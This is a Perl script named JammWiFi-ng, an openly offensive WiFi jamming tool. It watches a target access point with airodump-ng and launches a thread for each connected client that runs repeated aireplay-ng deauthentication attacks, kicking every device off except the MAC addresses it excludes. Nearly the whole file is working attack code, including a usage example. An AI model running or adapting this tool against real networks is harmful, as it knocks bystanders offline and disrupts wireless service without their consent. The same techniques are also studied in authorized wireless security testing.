#!/usr/bin/perl
#	JammWiFi-ng - a script for deauthenticating all clients on a network using aireplay deauth attack
#    Copyright (C) 2011 Ettore Di Giacinto <mailto:e.digiacinto@gmail.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

# TODO: * Using Thread::Pool instead of thread

use Getopt::Long;
use Data::Dumper;
use XML::TreeBuilder;
use threads ('yield');

my $PROG    = "JammWiFi-ng";
my $VERSION = "0.2";
system("clear");

print "
\e[1;35m\e[40m
######################################################################################
################################# -" . $PROG . " v" . $VERSION
  . "- #################################
################### -By mudler <http://hacklab-42.dark-lab.net>- #####################
\n";

my $result = GetOptions(
	"dev=s"        => \$dev,
	"channel=s"    => \$channel,
	"target=s"     => \$target,
	"cycle=s"      => \$cicle,
	"deauth=s"     => \$deauth,
	"direct"       => \$direct,
	"help"         => \$help,
	"exclude=s{,}" => \@EXCLUDED_MAC,
	"xterm"        => \$xterm,
	"verbose"      => \$verbose
);

if (   !defined($dev)
	|| !defined($channel)
	|| !defined($target)
	|| defined($help) )
{
	usage();
	exit();
}
$cicle  = 10 if !defined($cicle);
$deauth = 10 if !defined($deauth);
my %threads;
my $file;
my $tree = XML::TreeBuilder->new();
message(
	"Starting jamming on " 
	  . $dev
	  . " cycling every "
	  . $cicle . " for "
	  . $deauth
	  . " deauths",
	"Main", 0
);
message( "Kicking out all clients...", "Main", 0 );

if ( defined($verbose) ) {
	message( "Verbose mode on", "Main", 1 );
	$verbose = 1;
}
else {
	$verbose = 0;
}
if ( defined($direct) ) {
	message( "Direct Jamming on", "Main", 0 );
	$direct = 1;
}
else {
	$direct = 0;
}
if ( defined($xterm) ) {
	message( "Xterm mode on", "Main", 0 );
	$xterm = 1;
}
else {
	$xterm = 0;
}
$aireplay = threads->create( 'jamming', $target, $target, $dev, $deauth, 0, 0 );
$aireplay->join();
$airodump =
  threads->create( 'airodump', $dev, $channel, $deauth, $xterm, $target );

foreach my $excluded (@EXCLUDED_MAC) {
	message( $excluded, "Excluded", 1 );
}
`rm -rfv *.netxml`;

$SIG{'INT'} = sub {
	my $running = threads->list(threads::all);
	message( "Signal received, stopping all threads",      "Sighandler", 1 );
	message( $running . " process are going to be killed", "Sighandler", 1 );
	killthreads();
	message( "All clear, exiting", "Sighandler", 1 );
	exit();
};

while ( sleep $cicle ) {
	@XML = <*.netxml>;
	##Checking the Thread state....!
	message( "Checking states and joining the threads", "Threads", 0 );
	my @joinable_threads = threads->list(threads::joinable);
	my $joined           = 0;
	foreach my $joinable (@joinable_threads) {
		$joinable->join();
		delete $threads{ $joinable->tid() };
		$joined++;
	}
	message( "joined " . $joined . " threads", "Threads", 0 );
	my $found = 0;
	foreach my $file (@XML) {
		$tree->parse_file($file);
		foreach my $NETWORK ( $tree->find_by_tag_name('wireless-network') ) {
			if (    $NETWORK->find_by_tag_name('BSSID')->as_text eq $target
				and $found == 0 )
			{
				$found = 1;
				if ( $verbose == 1 ) {
					system("clear");
				}
				my $clients = 0;
				if ( defined $NETWORK->find_by_tag_name('wireless-client') ) {
					foreach my $CLIENT (
						$NETWORK->find_by_tag_name('wireless-client') )
					{
						$KILL =
						  $CLIENT->find_by_tag_name('client-mac')->as_text;
						my $is_excluded = 0;
						foreach my $special (@EXCLUDED_MAC) {
							if ( $special eq $KILL ) {
								$is_excluded = 1;
								message( $KILL . " is on EXCLUDED_MAC list!",
									"Excluded", 1 );

							}
						}
						if ( $is_excluded == 0 ) {
							my $exists = 0;
							while ( ( $key, $value ) = each(%threads) ) {
								if ( $value eq $KILL ) {
									$exists = 1;
								}
							}

							if ( $exists == 0 ) {
								$tr = threads->create(
									'jamming', $KILL,   $target, $dev,
									$deauth,   $direct, $verbose
								);
								message( $tr->tid() . " on " . $KILL . " !",
									"Threads", 1 );
								$threads{ $tr->tid() } = $KILL;

							}

						}
						$clients++;
					}
					my $threads_running = threads->list(threads::running);
					message(
						$target . " has " . $clients . " clients associated!",
						"Network", 1 );
					message( $threads_running . " threads running!",
						"Threads", 1 );
				}

			}
		}
	}
}

sub airodump {
	$dev         = $_[0];
	$channel     = $_[1];
	$deauth      = $_[2];
	$xterm       = $_[3];
	$target      = $_[4];
	$SIG{'KILL'} = sub {
		message( "Signal kill received, exiting [WAS airodump-ng thread]",
			"Threads", 0 );
		threads->exit();
	};
	if ( $xterm == 1 ) {
		system(
"xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c "
			  . $channel
			  . " -w airodumpoutput "
			  . $dev
			  . " --output-format netxml -a' 2>/dev/null" );
	}
	else {
		system(
"airodump-ng -a -c $channel -w airodumpoutput $dev -d $target --output-format netxml 2>/dev/null"
		);

	}

	threads->yield();

}

sub jamming {
	my ( $KILL, $target, $dev, $deauth, $direct, $verbose ) = @_;
	$SIG{'KILL'} = sub {
		message(
			"Signal kill received, exiting [WAS attacking on " . $KILL . "]",
			"Threads", 0 );
		threads->exit();
	};
	if ( $verbose == 1 ) {
		if ( $direct == 1 ) {
			message(
				$KILL . " with " . $deauth . " on " . $dev . " direct mode",
				"Attacking", 0 );
			system( "aireplay-ng --deauth " 
				  . $deauth . " -a " 
				  . $target . " -c "
				  . $KILL . " "
				  . $dev );
		}
		else {
			message( $KILL . " with " . $deauth . " on " . $dev,
				"Attacking", 0 );
			system( "aireplay-ng --deauth " 
				  . $deauth . " -a " 
				  . $KILL . " "
				  . $dev );
		}
	}
	else {

		if ( $direct == 1 ) {
			message(
				$KILL . " with " . $deauth . " on " . $dev . " direct mode",
				"Attacking", 0 );
			`aireplay-ng --deauth $deauth -a $target -c $KILL $dev`;
		}
		else {
			message( $KILL . " with " . $deauth . " on " . $dev,
				"Attacking", 0 );
			`aireplay-ng --deauth $deauth -a $KILL $dev`;
		}
		message( "Finished on " . $KILL . " with " . $deauth . " on " . $dev,
			"Attacking", 0 );

	}

#system("xterm -fn fixed -geom -0-0 -title 'Jamming ".$KILL."' -e 'aireplay-ng --deauth 30 -a ".$target." -c ".$KILL." ".$dev."'");
#threads->exit();
	threads->yield();
}

sub usage() {
	print "
	" . $PROG . " v" . $VERSION . "
	" . $PROG . " Performs an wifi jammer attack, that means that on the specified 
	access point only you and ony others specified MAC address will remain here.
		
	" . $0
	  . " --dev [DEVICE] --target [TARGET] --channel [CHANNEL] --cycle [CYCLE] --deauth [DEAUTH] --exclude [MAC_1] [MAC_2] [...] --verbose --direct
	
	Where:
	[DEVICE] is your device addres (monitor mode on)
	[TARGET] is the Access Point mac address
	[CHANNEL] is the channel where the Access point and the clients are...
	[CYCLE] Cicle time for checking new clients
	[DEAUTH] is the deauth count of aireplay
	[MAC_1] [MAC_2] [...] Mac addresses to exclude from the deauth process
	option --direct it's using the direct client deauth on aireplay (-c option)
	
	E.G. 
	" . $0
	  . " --dev mon0 --target AP:MAC:FF:AA:AA:AA --channel 11 --deauth 10 --cycle 20 --exclude MY:MAC:FF:AA:AA:AA  --direct --xterm

	\n";

}

sub killthreads() {
	my $tid     = $_[0];
	my @running = threads->list(threads::all);

	foreach my $thr (@running) {
		if ( defined($tid) and $thr->tid() == $tid ) {
			$thr->kill('KILL')->join();
		}
		if ( !defined($tid) ) {
			$thr->kill('KILL')->join();
		}
	}
}

sub message() {

	my $message = $_[0];
	my $obj     = $_[1];
	my $type    = $_[2];

	my %fg = (
		'default'      => "",
		'bold'         => "\e[1m",
		'black'        => "\e[30m",
		'red'          => "\e[31m",
		'blue'         => "\e[32m",
		'yellow'       => "\e[33m",
		'green'        => "\e[34m",
		'majenta'      => "\e[35m",
		'cyan'         => "\e[36m",
		'white'        => "\e[37m",
		'bold black'   => "\e[1;30m",
		'bold red'     => "\e[1;31m",
		'bold blue'    => "\e[1;32m",
		'bold yellow'  => "\e[1;33m",
		'bold green'   => "\e[1;34m",
		'bold majenta' => "\e[1;35m",
		'bold cyan'    => "\e[1;36m",
		'bold white'   => "\e[1;37m",
	);

	my %bg = (
		'default' => "",
		'black'   => "\e[40m",
		'red'     => "\e[41m",
		'green'   => "\e[42m",
		'yellow'  => "\e[43m",
		'blue'    => "\e[44m",
		'majenta' => "\e[45m",
		'cyan'    => "\e[46m",
		'white'   => "\e[47m"
	);

	if ( $type == 0 ) {

		print $fg{"bold white"}
		  . $bg{"red"} . "[!]"
		  . $fg{"bold majenta"}
		  . $bg{"black"} . "["
		  . $obj . "] "
		  . $fg{"bold white"}
		  . $bg{"black"}
		  . $message
		  . "\e[0m\n";
	}
	elsif ( $type == 1 ) {
		print $fg{"bold white"}
		  . $bg{"majenta"} . "[*]"
		  . $fg{"bold majenta"}
		  . $bg{"black"} . "["
		  . $obj . "] "
		  . $fg{"bold white"}
		  . $bg{"black"}
		  . $message
		  . "\e[0m\n";
	}

}
